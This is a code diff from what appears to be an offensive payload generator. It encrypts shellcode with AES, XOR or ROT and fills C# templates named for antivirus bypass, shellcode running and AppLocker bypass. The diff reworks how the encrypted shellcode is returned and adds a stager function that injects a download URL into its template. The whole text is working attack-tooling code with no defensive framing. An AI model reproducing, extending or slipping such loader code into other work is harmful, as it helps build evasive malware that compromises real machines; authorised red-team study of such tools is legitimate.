@@ -21,24 +21,24 @@ def encrypt(args, code, shellcode):
         if args.encrypt.upper() == 'AES':
             key = os.urandom(16)
             cipher = AES.new(key, AES.MODE_CBC)
-            ct_bytes = cipher.encrypt(pad(shellcode, AES.block_size))
+            shellcode = cipher.encrypt(pad(shellcode, AES.block_size))
             iv = cipher.iv
-            return code.replace('{{SHELLCODE}}', bytes_to_cs(ct_bytes)).replace('{{AES_KEY}}', bytes_to_cs(key)).replace('{{AES_IV}}', bytes_to_cs(iv))
+            return code.replace('{{AES_KEY}}', bytes_to_cs(key)).replace('{{AES_IV}}', bytes_to_cs(iv)), shellcode 
         elif args.encrypt.upper() == 'XOR':
             key = int.from_bytes(os.urandom(1))
-            return code.replace('{{SHELLCODE}}', bytes_to_cs(xor_encrypt(shellcode, key))).replace('{{XOR_KEY}}', hex(key))
+            return code.replace('{{XOR_KEY}}', hex(key)), xor_encrypt(shellcode, key)
         elif args.encrypt.upper() == 'ROT':
             key = int.from_bytes(os.urandom(1))
-            return code.replace('{{SHELLCODE}}', bytes_to_cs(rot_encrypt(shellcode, key))).replace('{{ROT_KEY}}', hex(key))
+            return code.replace('{{ROT_KEY}}', hex(key)), rot_encrypt(shellcode, key)
     else:
-        return code.replace('{{SHELLCODE}}', bytes_to_cs(shellcode))
+        return code, shellcode
 
 def av_bypass(args, shellcode):
     with open(os.path.join(path, 'templates/cs/av_bypass.cs'), 'r') as f:
         code = f.read()
     payload = delay(args, code)
-    payload = encrypt(args, payload, shellcode)
-    return payload
+    payload, shellcode = encrypt(args, payload, shellcode)
+    return payload.replace('{{SHELLCODE}}', bytes_to_cs(shellcode))
 
 def shellcode_runner(args, shellcode):
     with open(os.path.join(path, 'templates/cs/shellcode_runner.cs'), 'r') as f:
@@ -81,3 +81,9 @@ def applocker(args, url):
             cs_code = f.read()
             cs_code = cs_code.replace('{{URL}}', url)
     return cs_code, xml_code
+
+def stager(args, url, shellcode):
+    with open(os.path.join(path, 'templates/cs/stager.cs'), 'r') as f:
+        code = f.read()
+    code, shellcode = encrypt(args, code, shellcode)
+    return code.replace('{{URL}}', url), shellcode
